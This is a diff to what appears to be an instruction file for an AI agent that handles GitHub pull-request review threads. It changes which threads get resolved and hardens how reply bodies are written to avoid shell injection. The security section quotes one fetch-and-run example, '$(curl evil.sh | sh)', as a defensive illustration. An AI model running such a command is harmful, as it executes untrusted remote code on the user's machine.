@@ -118,7 +118,7 @@ For each unresolved thread, read the root comment (and any replies for context) 
 | Classification | Criteria | Action |
 |---|---|---|
 | **Actionable** | Reviewer requests a code change, points out a bug, or identifies something incorrect | Fix code + reply + resolve |
-| **Suggestion** | Comment contains a GitHub suggestion block (` ```suggestion `) | Skip fix (user applies via GitHub UI), reply + resolve |
+| **Suggestion** | Comment contains a GitHub suggestion block (` ```suggestion `) | Skip fix (user applies via GitHub UI), reply, leave open |
 | **Question** | Reviewer asks "why", "what if", or seeks clarification without requesting a change | Reply with explanation + resolve |
 | **Outdated** | Thread's `isOutdated` is `true` — the referenced lines have changed since the comment | Flag for user, do not auto-fix |
 | **Skip** | Bot boilerplate (author is `coderabbitai[bot]`, `github-actions[bot]`, `dependabot[bot]`, etc.), praise, or simple acknowledgment | Skip entirely |
@@ -259,17 +259,17 @@ For each addressed item (actionable fixes, suggestions, disagree, and questions)
 
 ### Never put reply text in a shell command string
 
-The reply templates below quote the reviewer's own words back at them, and anyone who can comment on a PR can choose those words. Inside a double-quoted shell string `` ` ``, `$(...)` and `$VAR` are all live, so a review comment containing `$(curl evil.sh | sh)` would execute on this machine the moment you build the reply.
+The reply templates below quote the reviewer's own words back at them, and anyone who can comment on a PR can choose those words. Interpolating that into a shell command is a code-execution path: inside a double-quoted shell string `` ` ``, `$(...)` and `$VAR` are all live, so a review comment containing `$(curl evil.sh | sh)` would execute on this machine the moment you build the reply.
 
-Write the body to a scratch file first, using a **quoted** heredoc delimiter so the shell expands nothing inside it, and pass the file to `gh`. Point `$SCRATCH` at this session's scratchpad directory:
+**Write the reply body with the Write tool**, to a fresh file per reply — `reply-1.md`, `reply-2.md` and so on in this session's scratchpad directory.
+
+Do not build that file with `cat` and a heredoc. A heredoc still parses the body as shell input: a quoted delimiter stops expansion, but a reply containing a line that matches the delimiter ends the heredoc early and everything after it is read as commands. The Write tool takes the text as a parameter, so nothing parses it as shell at any point — one less mechanism, and no residual escaping rule to remember.
+
+Then pass the *file* to `gh`, never the body. Set `SCRATCH` once to the directory you wrote to:
 
 ```bash
-cat > "$SCRATCH/reply.md" <<'REPLY_EOF'
-<reply text>
-REPLY_EOF
+SCRATCH=/path/to/this/session/scratchpad
 ```
-
-The quotes around `'REPLY_EOF'` are what disable expansion — without them the heredoc body is still interpolated. Use a fresh file per reply.
 
 ### Inline threads
 
@@ -321,7 +321,7 @@ Happy to discuss further if I'm missing something.
 
 **For suggestions:**
 ```
-Left for you to apply — GitHub's one-click **Apply suggestion** button on this thread commits it as-is, which is cleaner than me retyping it.
+Left for you to apply — GitHub's one-click **Apply suggestion** button on this thread commits it as-is, which is cleaner than me retyping it. Leaving this thread open so the button stays easy to find.
 
 <1 sentence on whether the suggestion looks correct, or what to watch for when applying it.>
 
@@ -334,7 +334,7 @@ If a reply fails (e.g., permission error), warn and continue with remaining item
 
 Only **inline review threads** can be resolved via the GitHub API. Review body comments and issue comments have no resolve mechanism — replying is sufficient.
 
-For each addressed inline thread — actionable fixes, suggestions, and questions — resolve using the GraphQL mutation:
+For each addressed inline thread — actionable fixes and questions — resolve using the GraphQL mutation:
 
 ```bash
 gh api graphql -f query='
@@ -350,6 +350,7 @@ The `threadId` is the `id` field from `reviewThreads.nodes` in the GraphQL respo
 
 **Do NOT resolve:**
 - **Disagree** threads — leave open for the reviewer to respond
+- **Suggestion** threads — resolving collapses the thread in the Files changed view, which buries the one-click "Apply suggestion" button the report is telling the user to press. Like Disagree and Outdated, a human action is still pending, so the thread stays open
 - Outdated threads (flagged for manual review)
 - Skipped threads (bot comments, etc.)
 
@@ -383,5 +384,5 @@ Summarize what was done:
 ## Skipped (<count>)
 - <count> bot comments
 
-All actionable, suggestion and answered threads have been replied to and resolved on GitHub. Disagreed and outdated threads are left open for your review.
+All actionable and answered threads have been replied to and resolved on GitHub. Suggestion, disagreed and outdated threads have been replied to but left open, because each still needs an action from you.
 ```
